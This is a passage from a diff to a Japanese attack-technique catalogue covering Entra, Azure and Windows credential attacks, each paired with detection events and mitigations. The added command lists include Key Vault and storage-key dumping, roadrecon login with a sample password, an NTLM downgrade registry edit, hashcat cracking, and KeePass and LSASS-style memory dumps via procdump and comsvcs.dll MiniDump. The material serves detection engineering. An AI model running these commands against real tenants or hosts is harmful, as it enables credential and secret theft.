     "how": "前提: 攻撃者は任意の有効なトークン(ユーザーの資格情報/リフレッシュトークン/JWT、またはサービスプリンシパルのシークレット・証明書)を1つ保有していればよく、Directory Readers相当の読み取り権限だけで大半を列挙できる。被害環境でのコード実行は不要で攻撃者ホストからリモート実行可能。手順: (1) GraphRunnerの`Get-GraphTokens`(デバイスコード/リフレッシュトークンフロー)や`roadrecon auth`でトークンを取得。(2) GraphRunnerの`Invoke-GraphRecon`でテナント全体の構成(組織情報、ディレクトリ設定、ユーザー/ゲスト招待可否、アプリ/グループ作成・同意可否、認証方式ポリシー)を、`Invoke-DumpCAPS`で全CAポリシーを`GET /identity/conditionalAccess/policies`から取得し、MFA除外・名前付き場所(location)除外・アプリ除外・レガシー認証許可といった『通り抜けられる穴』を特定する。(3) `Invoke-DumpApps`でアプリ登録・委任/アプリケーション権限・同意付与(oauth2PermissionGrants / appRoleAssignments)を列挙し、過剰権限アプリや悪用可能な同意ギャップを洗う。(4) ROADrecon(`roadrecon gather`)はディレクトリ全体(CAポリシー、動的グループのmembershipRule、アプリ登録、名前付き場所)をローカルSQLiteへ吸い出し、`roadrecon gui`やプラグインで可視化する。ROADreconは既定でレガシーなAzure AD Graph(graph.windows.net、api-version=1.61-internal、HTTPライブラリはaiohttp、短時間に多数のディレクトリ・コレクションへGET)を叩く点が指紋。GraphSpy(RedByte1337作)はトークン管理GUIからMicrosoft Graphを対話的に閲覧し同種の構成を読む。読み取り対象は `/identity/conditionalAccess/policies`・`/identity/conditionalAccess/namedLocations`・`/policies/authorizationPolicy`(ゲスト招待allowInvitesFrom)・`/organization`・`membershipRule`付き `/groups`(自己参加可能な動的グループ)・`/servicePrincipals`+`/oauth2PermissionGrants`(AAD Graph経由なら `/myorganization/policies`・`/groups` 等の相当URI)。中核プリミティブは、アイデンティティ・グラフではなく『ポリシー姿勢』を列挙して、次のConditional Accessバイパス経路(除外の穴)と、属性を書き換えて自己参加できる動的グループ(=昇格経路)を事前計画する点(=T1526)。重要な検知上の性質: これらのCA/構成のGET読み取りはEntra監査ログ(AuditLogs)にはイベントを生成しない(Invoke-DumpCAPSはログにイベントを残さないことが確認されている)。GraphRunner/GraphSpyはMicrosoft Graph(graph.microsoft.com)を叩くためMicrosoft Graph Activity Logs(MicrosoftGraphActivityLogsテーブル)に、ROADreconはレガシーAzure AD Graph(graph.windows.net)を叩くためAADGraphActivityLogs(2026年GA)にのみ残る点に注意し、両方を監視する。したがって検知は監査ログではなく両Graph Activity Logsでの `/conditionalAccess/policies`・`/policies`・`/organization`・動的グループ定義への認証済みGETバーストを狙う必要があり、これはAzureHoundの `/users,/groups,/servicePrincipals,/roleManagement` パターンとは読み取り対象が異なる。CVE・パッチは存在せず、対象はテナントの設定・権限モデルそのものである。",
     "tools": "GraphRunner (Get-GraphTokens / Invoke-GraphRecon / Invoke-DumpCAPS / Invoke-DumpApps), ROADtools / roadrecon (roadrecon auth・gather・gui; 既定でレガシーAzure AD Graph=graph.windows.net, aiohttp), GraphSpy (RedByte1337), Microsoft Graph PowerShell, AADInternals, TokenTactics(トークン取得の踏み台)",
+    "cmd": [
+      {
+        "tool": "GraphRunner",
+        "t": "デバイスコード/RTフローでGraphトークンを取得。以降の全モジュールの起点で$tokensにキャッシュされる",
+        "q": "Get-GraphTokens"
+      },
+      {
+        "tool": "GraphRunner",
+        "t": "全CAポリシーを列挙しMFA/場所/アプリ除外の穴を洗う。読み取りAPIのみでAuditLogsにイベントを残さない点が特徴",
+        "q": "Invoke-DumpCAPS -Tokens $tokens -ResolveGuids"
+      },
+      {
+        "tool": "GraphRunner",
+        "t": "アプリ登録・委任/アプリケーション権限・OAuth同意を一括ダンプ。過剰権限アプリや同意ギャップを事前に洗い出す",
+        "q": "Invoke-DumpApps -Tokens $tokens"
+      },
+      {
+        "tool": "GraphRunner",
+        "t": "テナント構成(ゲスト招待・同意設定・認証方式ポリシー)を偵察。graph.microsoft.comへの短時間バーストがMicrosoftGraphActivityLogsに残る",
+        "q": "Invoke-GraphRecon -Tokens $tokens -PermissionEnum"
+      },
+      {
+        "tool": "roadrecon",
+        "t": "CAポリシー・動的グループ・アプリ登録をローカルSQLiteへ丸ごと吸い出す。既定でレガシーAzure AD Graphを叩くためAADGraphActivityLogs側で捕捉する",
+        "q": "roadrecon auth -u svc_user@corp.onmicrosoft.com -p 'Passw0rd!' && roadrecon gather"
+      }
+    ],
     "detect": "主テレメトリはクラウド側のGraph Activity Logs。GraphRunner/GraphSpy(Microsoft Graph=graph.microsoft.com)は MicrosoftGraphActivityLogs、ROADrecon(レガシーAzure AD Graph=graph.windows.net)は AADGraphActivityLogs(2026年GA)。いずれもLog Analytics/Sentinelでは同名テーブルだが既定オフのため要有効化。単一プリンシパル(UserId/AppId)からの短時間・GETバーストで、RequestUri が `/identity/conditionalAccess/policies`・`/identity/conditionalAccess/namedLocations`・`/policies/authorizationPolicy`・`/organization`・`membershipRule` 付き `/groups`(AAD Graph側は `/policies`・`/groups` 相当)など『構成/ポリシー』リソースに集中するのが本技法の指紋。重要: これらの読み取りは Entra AuditLogs には現れない(監査ログを見ても検知できない)ため、AzureHound向けの `/users,/groups,/servicePrincipals,/roleManagement` 監視とは別に構成URIパターンを見張る。相関の二次信号として SigninLogs / EntraIdSignInEvents(旧EntraIdSignInEvents。2025-12にEntraIdSignInEventsへ改称)で当該トークン発行(非対話/新規IP・国、Resource=Microsoft Graph または Azure AD Graph)を確認。UserAgent は ROADrecon の aiohttp(api-version=1.61-internal も指紋)、GraphRunner/GraphSpy の PowerShell/python 系が手掛かり(変更可)。エンドポイント側は攻撃者ホストで GraphRunner/roadrecon/graphspy の実行(DeviceProcessEvents)と graph.microsoft.com / graph.windows.net への発信(DeviceNetworkEvents)を捕捉。判定は『構成リソースへの集中 × リソース種別の多様性 × 新規IP/UA × 監査ログに対応イベントが無いこと』の相関で行う。",
     "events": "MicrosoftGraphActivityLogs(GraphRunner/GraphSpyのMS Graph=graph.microsoft.com。単一プリンシパルのGETバーストが /identity/conditionalAccess/policies・/namedLocations・/policies/authorizationPolicy・/organization・membershipRule付き/groups に集中 = ポリシー姿勢の偵察。RequestMethod=GET, ResponseStatusCode 2xx。※CA/構成の読み取りはここにのみ残り AuditLogs には出ない), AADGraphActivityLogs(ROADrecon等が使うレガシーAzure AD Graph=graph.windows.net の同種の構成/ポリシーGETバースト。2026年GA・要有効化。MicrosoftGraphActivityLogsには出ないため別途監視), SigninLogs / EntraIdSignInEvents(旧EntraIdSignInEvents、2025-12改称。トークン発行、Resource=Microsoft Graph/Azure AD Graph、非対話/新規IP), Security 4688(攻撃者ホストでの GraphRunner/roadrecon/graphspy・powershell/python 実行), Entra AuditLogs(注記: これらの読み取りは記録されず、後続の除外悪用や動的グループ自己参加=member追加/属性変更のみ捕捉)",
     "mitigate": "(1) Microsoft Graph Activity Logs と AADGraphActivityLogs(レガシーAzure AD Graph)の両方を有効化し Log Analytics/Sentinel へ転送(サインインログだけではCA読み取りは見えず、ROADrecon等のAAD Graph経由はMicrosoftGraphActivityLogsにも出ない)。構成URIへのGETバーストをアラート化。(2) 既定の全ユーザー/ゲストによるディレクトリ読み取りを制限(External collaboration / ユーザー設定でユーザー・アプリ・デバイス読み取りを制限、ゲスト権限を最小化)。(3) 本偵察が探す『穴』を先に塞ぐ: CAの広範なアプリ/場所/ユーザー除外を撤廃、フィッシング耐性MFA+準拠デバイス必須、レガシー認証停止、Identity Protection のリスクベースCA。(4) 動的グループの membershipRule を棚卸しし、ユーザーが自己設定できる属性(department 等)をキーにした『自己参加可能』ルールを排除して昇格経路を断つ。(5) 過剰なアプリケーション権限・古い同意(oauth2PermissionGrants)を棚卸し・削減。(6) PIM/Just-in-Time で常設ロールを削減、長寿命シークレット/証明書を排除し窃取トークンの価値を下げる。トークン保護・リスク時のリフレッシュトークン失効を運用。(7) 使わないなら レガシーAzure AD Graph(graph.windows.net)自体をブロック/監視し、Microsoft Graph / Azure Management への不明デバイス・国・リスクサインインをCAでブロック。",
@@ -10127,6 +16502,38 @@ AD.I18N.ja.attacks = [
     "summary": "MicroBurstやPowerZureで、IDグラフ(AzureHound)の外側にあるAzureリソース面(ストレージ/公開Blob/Key Vault/Automation runbook/App Service/VM)を横断列挙し、埋め込み資格情報やシークレットを収穫する偵察。認証不要の公開Blob総当りから、認証後のGet-AzPasswordsによるKey Vault・Automation・ストレージキーの一括抽出までを含む。ハイブリッド侵害はIDグラフではなくこのリソース面を経由することが多く、公開Blob/Key Vault/runbookに埋め込まれた1つの資格情報がAzureHoundが『狙え』としか言えないアカウントそのものを手渡す。したがって大量ARM列挙とシークレット取得の検知がSOCの要点となる。",
     "how": "前提: 有効なEntra/Azureトークン(Reader程度の低RBACでも可)またはSAS/公開設定。多くの偵察は認証不要の公開Blob探索から始まり、MicroBurstのInvoke-EnumerateAzureBlobsが辞書と順列で <account>.blob.core.windows.net の存在と公開コンテナ(コンテナ/BlobのACL=anonymous)をDNS/HTTPで総当りし、公開されたバックアップ・構成ファイル・.env・端末プロビジョニングスクリプトを収集する。認証後はConnect-AzAccount/az loginのコンテキストでARM(management.azure.com)のREST/PowerShellを叩き、IDグラフの外側にあるリソース面(サブスクリプション/リソースグループ/ストレージ/Key Vault/Automation/App Service/VM)を横断列挙する。中核はGet-AzPasswordsで、ストレージのlistKeys、Key Vaultのシークレット/証明書GET、Automation Accountの保存資格情報とrunbook(平文資格情報が埋め込まれがち)エクスポート、App Serviceの発行プロファイル/接続文字列、VMのrun-command経由のシークレット取得をまとめて回収する。特にAutomationでは一時的なrunbook/Automation資格情報を作成→実行→削除して、managed identityトークンや保存資格情報を吐かせる手口が典型で(Get-AzPasswordsは15文字のランダムなrunbook名を生成しrunbookを削除するがJobsページに痕跡が残る)、短命な制御プレーンオブジェクトの生成が痕跡となる。PowerZureも同様にサブスクリプション横断でリソース・ロール・ストレージ・Key Vault・Functionを列挙し、Get-AzureTarget/Get-AzureRunbookContent/Get-AzureKeyVaultContent等でラテラルの足場を探す。これらは正規のAzure REST API(listKeys/listSecrets/runCommand/Key Vault AuditEvent)を用いるため単体では通常運用と見分けづらく、単一プリンシパルからの短時間・広範囲の列挙と一時オブジェクト作成の相関が識別鍵となる。この技法は発見(T1580/T1526)に加え、Get-AzPasswords/Key Vaultダンプという資格情報アクセス(T1552.001 App Service構成/runbook埋め込み資格情報, T1555.006 クラウドシークレット管理ストア=Key Vaultシークレット取得)を跨ぐ複合面で、reconはその大量列挙の性質に着目した位置づけ。取得したKey Vault/Automation/App Serviceの資格情報は、そのままクラウド横展開・特権昇格の起点になる。",
     "tools": "MicroBurst (Invoke-EnumerateAzureBlobs, Invoke-EnumerateAzureSubDomains, Get-AzPasswords [-Keys/-AutomationAccounts/-AppServices/-StorageAccounts を Y|N でトグルしKey Vault/Automation/App Service/ストレージキーを収集], Get-AzKeyVaultsAutomation, Get-AzureDomainInfo/Get-AzDomainInfo), PowerZure (Get-AzureTarget, Get-AzureRunbookContent, Get-AzureKeyVaultContent, Export-AzureKeyVaultContent, Invoke-AzureCommandRunbook), Az PowerShell module (Get-AzKeyVaultSecret -AsPlainText, Get-AzStorageAccountKey), Azure CLI (az storage/keyvault/automation), ROADtools (roadrecon), Stormspotter",
+    "cmd": [
+      {
+        "tool": "MicroBurst",
+        "t": "Key Vault・Automation・App Service・ストレージキーを一括収集。各サービスの`SecretGet`/`listKeys`が短時間に連続するのが識別鍵",
+        "q": "Get-AzPasswords -Keys Y -AutomationAccounts Y -AppServices Y -StorageAccounts Y"
+      },
+      {
+        "tool": "MicroBurst",
+        "t": "認証不要で`<account>.blob.core.windows.net`を辞書総当り。DNS/HTTPログにしか残らずEntra監査ログには一切現れない",
+        "q": "Invoke-EnumerateAzureBlobs -Base corp -OutputFile blobs.txt"
+      },
+      {
+        "tool": "Az PowerShell",
+        "t": "Key Vaultからシークレットを平文取得。監査イベント`SecretGet`が唯一の痕跡で低RBAC(Reader+アクセスポリシー)でも成立",
+        "q": "Get-AzKeyVaultSecret -VaultName corp-kv -Name svc-password -AsPlainText"
+      },
+      {
+        "tool": "Az PowerShell",
+        "t": "ストレージアカウントの管理キーを取得。ARMの`listKeys`アクションがActivity Logに残る唯一の痕跡",
+        "q": "Get-AzStorageAccountKey -ResourceGroupName corp-rg -AccountName corpstorage"
+      },
+      {
+        "tool": "PowerZure",
+        "t": "Key Vault配下の全シークレット/証明書を一括エクスポート。短時間の`SecretList`+`SecretGet`連打が識別鍵",
+        "q": "Export-AzureKeyVaultContent -Vault corp-kv"
+      },
+      {
+        "tool": "Az CLI",
+        "t": "az cliから直接ストレージキーを列挙。プロセスログは残らずActivity Logの`listKeys`操作のみが手掛かり",
+        "q": "az storage account keys list --resource-group corp-rg --account-name corpstorage"
+      }
+    ],
     "detect": "Azure Activityログでの単一プリンシパル/CallerIpAddressからの短時間・多数リソースへのlistKeys/listSecrets/runCommand・Automation runbook作成→開始→削除の一時操作、Key Vault診断ログ(Category=AuditEvent)でのSecretGet/VaultGet/SecretList大量列挙、Storage診断(StorageBlobLogs)の匿名GetBlob/ListBlobs(404連発+一部200)を、同一発信元で相関する。操作端末側ではMicroBurst/PowerZure/Get-AzPasswords/Invoke-EnumerateAzureBlobsのプロセス起動とPowerShell ScriptBlock(EID4104, Microsoft-Windows-PowerShell/Operationalログ。Sysmonではない)を監視。ただし攻撃がAzure Cloud Shellや盗んだトークンでEDR外ホストから実行された場合、ホストテレメトリは残らずクラウド側ログが主シグナルとなる。",
     "events": "AzureActivity(ARM制御プレーン: */listKeys/action, */runCommand/action, MICROSOFT.AUTOMATION runbook作成/開始, Caller/CallerIpAddress/OperationNameValue/ActivityStatusValue), AzureDiagnostics(ResourceType=VAULTS, Category=AuditEvent: SecretGet/VaultGet/KeyGet/SecretList, CallerIPAddress), StorageBlobLogs(AuthenticationType=Anonymous, OperationName=GetBlob/ListBlobs, StatusCode 404/200), Sysmon EID1(ProcessCreate), PowerShell Operational EID4104(ScriptBlock ※Sysmonではなく Microsoft-Windows-PowerShell/Operational), Security 4688, MDE DeviceProcessEvents/CloudAppEvents",
     "mitigate": "公開Blob/コンテナのanonymousアクセスを禁止(ストレージのallowBlobPublicAccess=false)、Key VaultをRBAC+ファイアウォール+Private Endpointで保護しシークレットのローテーション・有効期限・パージ保護を徹底する。Automation runbook/変数/資格情報に平文シークレットを置かずmanaged identityを使用し、App Service接続文字列はKey Vault参照へ移行。最小権限RBAC(不要なReader/Contributor剥奪、listKeys/runCommand権限の限定)、PIM+条件付きアクセス、Microsoft Defender for Cloud/for Storageの脅威検知を有効化する。Azure Activity/Key Vault/Storage診断ログを集約し、単一プリンシパルの広範囲listKeys・一時Automationオブジェクト生成・大量Secret読取をアラート化する。",
@@ -10172,6 +16579,28 @@ AD.I18N.ja.attacks = [
     "summary": "LSASSメモリを一切読まずに、ローカルのNTLM SSP(SSPI)を悪用してログオン中ユーザのNetNTLMv1(ESS無)応答をプロセス内で誘発し、既知の固定チャレンジ(通常0x1122334455667788)+DES総当り(crack.sh/hashcat -m 5500)でNTハッシュへ確定復元する資格情報奪取。lsassメモリ読取・注入・ネットワーク認証がいずれも発生しないため、EDRの『lsass.exeへの不審ハンドルオープン』検知を回避する点が本質的価値。ただし『Credential Guardを無力化』は誤り——作者Elad Shamir自身の再検証でCG有効環境ではv1誘発が失敗しNetNTLMv2しか得られず(決定的解読不可)、CGはむしろ本手法のv1経路を遮断する。LmCompatibilityLevel等を一時的に下げESS(NTLMv2セッションセキュリティ)を無効化してNetNTLMv1を強制する必要があり、この一時改変→復元が主検知点。lsass監視は堅牢だがCredential Guard未導入の環境で有効な第一選択肢。",
     "how": "前提: ローカル管理者/SYSTEM(対話トークンなりすましのためのSeImpersonatePrivilege/SeDebugPrivilege相当)。(1) HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\LmCompatibilityLevel を一時的に0〜2へ下げ、MSV1_0\\NtlmMinClientSec のNTLMv2セッションセキュリティ(ESS)要求と RestrictSendingNTLMTraffic を緩め、ESS無しNetNTLMv1応答の送出を許可する(T1112)。(2) 対話ログオン中(非ネットワークトークン)の各ユーザのプロセストークンを列挙し、ImpersonateLoggedOnUser で各トークンになりすます(T1134.001)。(3) その資格情報コンテキストでローカルNTLM SSPに対し擬似NTLMハンドシェイク(AcquireCredentialsHandle→Type1→Type2→Type3)をプロセス内で完結させる際、攻撃者が固定チャレンジ(通常0x1122334455667788)とESS無効フラグを仕込んだType2(CHALLENGE)を用い、InitializeSecurityContext で Type3(AUTHENTICATE)を生成させる——AcceptSecurityContextにランダムチャレンジを生成させないことが要点で、固定チャレンジでなければ決定的解読は成立しない。(4) Type3内のNetNTLMv1応答(なりすましユーザのNTハッシュとDESで計算)を抽出。(5) レジストリ値を復元し痕跡を最小化。(6) 固定チャレンジ×ESS無のNetNTLMv1はDES総当りが決定的で、crack.shのレインボーテーブルやhashcat(-m 5500)でNTハッシュへ確定復元できる。認証を成立させず外部SMB/HTTP認証も生成しないため成功NTLM認証イベントは残らず、強制認証(T1187/Coercion)ではない——認証は全てローカルSSPIで完結する。ダウングレード/ESS無効化無しではNetNTLMv2しか得られず決定的に解読できないため、レジストリ改変が本手法の成立要件。【重要な訂正】本手法は『Credential Guardを無力化する』のではない: 作者Elad Shamirの再検証では、Credential Guard有効環境でESS無NetNTLMv1の誘発が失敗し(Microsoft-Windows-NTLM/Operational 4013/4014でブロックが記録)、良くてNetNTLMv2しか取得できない(negative results)。真の価値はLSASSに触れずEDRのlsassハンドル監視を回避する点で、CG未導入かつlsass監視のみの環境、またはCGが資格情報を隔離しないローカルSAMアカウントに対して有効。",
     "tools": "eladshamir Internal-Monologue (Internal-Monologue.exe / Invoke-InternalMonologue.ps1), crack.sh (固定チャレンジ×ESS無 NetNTLMv1のDES確定復元/レインボー), hashcat (-m 5500 NetNTLMv1), impacket(復元NTハッシュのPass-the-Hash再利用)",
+    "cmd": [
+      {
+        "tool": "InternalMonologue",
+        "t": "LmCompatibilityLevelを一時的に下げESSを無効化しローカルSSPIでNetNTLMv1を誘発。lsassハンドルは一切開かない",
+        "q": "InternalMonologue.exe -Downgrade true -Threads true -Impersonate true"
+      },
+      {
+        "tool": "PowerShell",
+        "t": "同攻撃のPowerShell/Empire移植版。4104に`Invoke-InternalMonologue`が残るファイルレス経路",
+        "q": "Invoke-InternalMonologue -Downgrade -Impersonate"
+      },
+      {
+        "tool": "reg.exe",
+        "t": "本手法成立に必須の一時改変。LmCompatibilityLevelが短時間で変更後に元へ戻る挙動が最有力の検知点",
+        "q": "reg.exe add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\" /v LmCompatibilityLevel /t REG_DWORD /d 1 /f"
+      },
+      {
+        "tool": "Hashcat",
+        "t": "固定チャレンジ×ESS無のNetNTLMv1をDES総当りで確定復元。モード5500の出現自体が本手法成立の裏付け",
+        "q": "hashcat -m 5500 -a 0 netntlmv1.txt rockyou.txt"
+      }
+    ],
     "detect": "最も高精度な宿主シグナルは LmCompatibilityLevel/NtlmMinClientSec/RestrictSendingNTLMTraffic の一時的な低下→復元(Sysmon 13/4657, MDE DeviceRegistryEvents)で、改変プロセスがgpsvc(svchost)以外なら高疑。本手法はローカルSSPI内で完結し認証を成立させないため、成功NTLM認証(4624 LmPackageName=\"NTLM V1\")もRestrict NTLM監査(8001-8004)も発火しない——これらは本手法の直接検知には使えず、あくまで後続のPass-the-Hash再利用や別系統のネットワークNetNTLMv1ダウングレード(Responder/強制認証)を拾う補助シグナル。Credential Guard有効環境ではv1資格キー取得が拒否され Microsoft-Windows-NTLM/Operational 4013(NTLMv1BlockedByCredGuard)/4014(NTLMGetCredentialKeyBlockedByCredGuard)が本手法試行の痕跡として記録され得る。SeImpersonate/SeDebugを持つ不審プロセスの起動(4672/4688/Sysmon 1)やInternal-Monologue系コマンドライン、復元NTハッシュのPass-the-Hash再利用(後続の4624 Type3 NTLM)を相関する。EDRの『lsass.exeへのOpenProcess』監視(Sysmon 10)は本手法に対して盲目なので依存しない。",
     "events": "4657 (Lsa配下のLM/NTLM強度値変更, 要レジストリSACL監査), Sysmon 13 (RegistryValueSet), 4688 / Sysmon 1 (Internal-Monologue系プロセス実行), 4672 (SeImpersonate/SeDebug付与), Microsoft-Windows-NTLM/Operational 4013 (NTLMv1BlockedByCredGuard) / 4014 (NTLMGetCredentialKeyBlockedByCredGuard) — Credential Guard有効時のv1/資格キー取得ブロック=本手法試行の痕跡, ※本手法はローカル完結・認証非成立のため 4624(LmPackageName=\"NTLM V1\")・Restrict NTLM監査 8001-8004・lsass監視(Sysmon 10)はいずれも発火しない——4624 v1/8001-8004は後続のネットワーク再利用や別系統のv1ダウングレード検知用の補助シグナルとして扱う",
     "mitigate": "GPOで LmCompatibilityLevel=5(NTLMv2応答のみ送受)を全端末に強制し、当該値の一時改変をEDR/レジストリ監査で高疑ブロックする。NtlmMinClientSec/NtlmMinServerSec でNTLMv2セッションセキュリティ(ESS, 0x20080000)を必須化し、ESS無NetNTLMv1を機構的に不能にする。Network security: Restrict NTLM系ポリシーとチャネルバインディングでNTLMを段階的に廃止しKerberosへ移行。ローカル管理者権限とSeImpersonate/SeDebugの割当を最小化。ドメイン全体でNTLM監査を有効化しNetNTLMv1使用を可視化・根絶。Credential Guardを有効化する——作者自身の再検証でCG有効環境ではESS無NetNTLMv1の誘発が失敗しNetNTLMv2しか得られない(=決定的解読不可)ことが確認されており、CGは本手法のv1誘発経路に対する有効な緩和である(v1資格キー取得ブロック時にNTLM/Operational 4013/4014が記録)。ただしCGはローカルSAMアカウントの資格情報は隔離しないため、レジストリ強制(LmCompatibilityLevel=5 / NtlmMinClientSecでESS必須化)によるNetNTLMv1の機構的無効化とNTLM廃止を併用することが本質的対策。",
@@ -10217,6 +16646,28 @@ AD.I18N.ja.attacks = [
     "summary": "パスワードマネージャのマスターキーや復号済み秘密を、対象プロセスのメモリ・pagefile.sys・hiberfil.sys・フルRAMイメージから抽出する手法。KeePass 2.x(<2.54)は CVE-2023-32784 により、入力欄 SecureTextBoxEx に残る文字別の .NET string 残骸から(先頭1文字を除いて)マスターパスワードを平文復元でき、ワークスペースがロック中でもアプリ終了後でも成立する(キーボードで1文字ずつ打鍵した場合のみ。クリップボード貼付では残骸が生成されず不成立)。KeePassXC/Bitwarden/1Password 等は本CVEの対象外だが、アンロック中プロセスの平文秘密や導出済み vault 鍵を汎用のプロセスメモリスクレイプ(T1555.005)で窃取できる。管理者がドメイン/ローカル管理者・サービスアカウントを vault に保管している場合、マスターキー奪取が vault 全体の侵害に連鎖する。",
     "how": "前提: 対象ユーザセッションのメモリを読める権限(同一ユーザ、または他ユーザプロセスのダンプ/生ボリューム(pagefile.sys・hiberfil.sys)読取のためのローカル管理者/SYSTEM)。CVE-2023-32784(KeePass 2.x <2.54 限定): マスターパスワード入力用のカスタムコントロール SecureTextBoxEx が、1文字入力するたびに「●●●x」形式(先頭がプレースホルダ●、末尾が実文字)の managed .NET string 残骸をヒープに残す。.NET の性質上いったん生成された文字列は回収困難で、入力欄をクリアしても・DBをロックしても・KeePass.exe を終了してもプロセスヒープやスワップに残存する。攻撃者は KeePass.exe のプロセスダンプ(procdump -ma / rundll32 comsvcs.dll,MiniDump <pid> / タスクマネージャの「ダンプファイルの作成」/ PowerShell Out-Minidump)や pagefile.sys・hiberfil.sys・フルRAMイメージから、この位置別残骸を keepass-dump-masterkey(vdohney keepass-password-dumper / 同梱の KeePassDumpFull ダンプ)で位置順に再構成し、マスターパスワードを平文復元する。仕様上、第1文字だけは信頼して回収できないが、それ以外の全文字が得られるため辞書/総当りは1〜2文字分に激減する。マスターパスワードをキーボードで打鍵した場合にのみ残骸が生成され、クリップボードから一括貼付した場合は文字別残骸が残らない。KeePass 2.54 で修正済み。より一般には(T1555.005 プロセスメモリスクレイプ): KeePassXC・Bitwarden デスクトップ・1Password 等は本CVEの対象外だが、アンロック中のプロセスメモリには復号済みエントリや導出済みの vault 鍵(マスター鍵からの派生鍵)が平文で存在するため、プロセスメモリを走査して秘密や vault 鍵を直接スクレイプする(LaZagne が KeePass/KeePassX/多数のマネージャに対応)。マスターキー/パスワードの最終再構成はダンプ・pagefile.sys・hiberfil.sys を持ち出したオフラインで実施でき、EDRからは不可視な工程となる——ホスト上の観測点は「メモリダンプ取得」と「スワップ/ハイバーファイルの読取・持出」に限られる。",
     "tools": "vdohney keepass-password-dumper (keepass-dump-masterkey / KeePassDumpFull), LaZagne, procdump/procdump64, rundll32 comsvcs.dll MiniDump, PowerShell Out-Minidump, タスクマネージャ(手動ダンプ), keepass2john(派生鍵の総当り補助)",
+    "cmd": [
+      {
+        "tool": "procdump.exe",
+        "t": "KeePass.exeのフルメモリダンプを取得。DBロック中/終了後でも文字別残骸は消えず`-ma`が主要な検知点",
+        "q": "procdump.exe -ma KeePass.exe C:\\Windows\\Temp\\keepass.dmp"
+      },
+      {
+        "tool": "rundll32.exe",
+        "t": "comsvcs.dllのMiniDumpエクスポートを使うファイルレス代替。対象PIDに依らずLOLBinとして常に不審",
+        "q": "rundll32.exe C:\\Windows\\System32\\comsvcs.dll,MiniDump <PID> C:\\Windows\\Temp\\keepass.dmp full"
+      },
+      {
+        "tool": "keepass-dumper",
+        "t": "CVE-2023-32784専用ツール。ダンプ内の文字別.NET string残骸からマスターパスワードを位置順に再構成",
+        "q": "dotnet KeePassDumpFull.dll keepass.dmp"
+      },
+      {
+        "tool": "LaZagne",
+        "t": "KeePass含む多数のマネージャを横断スクレイプする汎用ツール。CVE専用ツールより多モジュール実行がノイズになる",
+        "q": "lazagne.exe all"
+      }
+    ],
     "detect": "KeePass.exe/KeePassXC.exe/Bitwarden.exe/1Password.exe 等マネージャプロセスへの非セキュリティ製品からの OpenProcess(Sysmon EID10 GrantedAccess にダンプ系マスク 0x1410/0x1010/0x1FFFFF; procdump・taskmgr=0x1410, comsvcs.dll MiniDump=PROCESS_ALL_ACCESS 0x1FFFFF)、当該プロセスの .dmp 生成(Sysmon 11 / MDE DeviceFileEvents FileCreated)、procdump・rundll32 comsvcs.dll,MiniDump・タスクマネージャ・Out-Minidump の実行(4688/Sysmon 1)、pagefile.sys・hiberfil.sys への非System生プロセスアクセス(4663)、keepass-dump-masterkey/KeePassDumpFull/LaZagne の実行を監視する。最終復元はオフラインのため、ダンプ/スワップ/ハイバーファイルの大容量コピー・外部送出も相関材料になる。KeePass のバージョン(<2.54)を資産管理で突合し脆弱端末を優先監視。",
     "events": "Sysmon 10(KeePass/KeePassXC/Bitwarden への ProcessAccess, GrantedAccess=ダンプ系マスク 0x1410/0x1010/0x1FFFFF), Sysmon 11(.dmp 作成), 4663(pagefile.sys/hiberfil.sys/マネージャプロセスへのアクセス), 4688/Sysmon 1(procdump, rundll32 comsvcs.dll, LaZagne, keepass-dump-masterkey), 4104(PowerShell Out-Minidump/MiniDump)",
     "mitigate": "KeePass を 2.54 以降へ更新して CVE-2023-32784 を解消する。残骸は再起動まで pagefile/hiberfil に残るため、更新後に再起動し、ClearPageFileAtShutdown 有効化・hibernation 無効化(hiberfil.sys 除去)・BitLocker 等の全ディスク暗号化でスワップ/ハイバーファイルを保護する。本CVEはマスターパスワードを1文字ずつ打鍵した場合のみ成立するため、クリップボード貼付・キーファイル・Windows Hello 等で入力すると文字別残骸を回避できる(過渡的緩和。恒久策は 2.54 更新)。全マネージャ共通: 自動ロック時間の短縮・クリップボード自動消去・KeePassXC のメモリ保護等ハードニング設定を有効化。ローカル管理者権限を最小化して他ユーザプロセスのダンプ/生ボリューム読取を抑止し、EDR/ASR でマネージャプロセスへのメモリダンプ・OpenProcess を監視・ブロックする。最重要: Tier-0 のドメイン/ローカル管理者・サービスアカウントを汎用パスワードマネージャに保存せず、専用 PAM/資格情報保管庫(チェックアウト・自動ローテーション)へ隔離する。",
@@ -10262,6 +16713,38 @@ AD.I18N.ja.attacks = [
     "summary": "ドメイン参加Linux(SSSD/realmd/winbind/Centrify等でAD統合されたメンバ/踏み台ホスト)でrootを得た攻撃者が、/tmpや$KRB5CCNAMEのccache・/etc/krb5.keytab・SSSD/KCMキャッシュ(/var/lib/sss)からAD principalのKerberosチケット/鍵材料を窃取し、Pass-the-TicketでSMB/MSSQL/HTTPへ認証する*nix→Windowsフォレストのピボット。ccacheは再利用可能なTGT、keytabは失効しない対称鍵材料で、後者はkinit -ktにより恒久的に新規TGTを発行できる。SOCがLinux側テレメトリを計装しにくいため、Linuxを起点にしたAD侵害の橋渡し面になりやすい。",
     "how": "前提はドメイン参加Linuxホスト上のroot(またはCAP_DAC_READ_SEARCH相当)。(1) ccache収集: FILE型ccacheである/tmp/krb5cc_<uid>_*や各プロセスの$KRB5CCNAMEが指すパス、KEYRING:/KCM型キャッシュを列挙し、他ユーザ(root含む管理者やサービス)のTGT/TGSを回収する。(2) keytab: /etc/krb5.keytab(ホストHOST$やサービスの長期鍵)や個別サービスkeytabを読み、klist -kでprincipal/kvno/enctype(aes256-cts/aes128/rc4)を確認する。keytabは対称Kerberos鍵を保持するため失効せず、kinit -kt /etc/krb5.keytab HOST$@REALMで新鮮なTGTを何度でも取得できる。(3) SSSDキャッシュ: /var/lib/sss/db/ccache_*(レガシFILE型ccache)や、KCM(sssd-kcm)の秘密ストア/var/lib/sss/secrets/secrets.ldb(/var/lib/sss/secrets/.secrets.mkeyで暗号化)から復号済みのキャッシュTGTを抽出する(SSSDKCMExtractor等)。(4) linikatzがSSSD/FreeIPA/Samba/Centrify/VAS(PBIS)横断でccache・keytab・secrets.ldbの抽出を自動化する。(5) 悪用: 窃取ccacheはexport KRB5CCNAME=<file>で自プロセスに注入、またはimpacket ticketConverter.pyで.ccache↔.kirbiを相互変換し、impacket -k -no-pass(secretsdump/psexec/mssqlclient)やNetExec 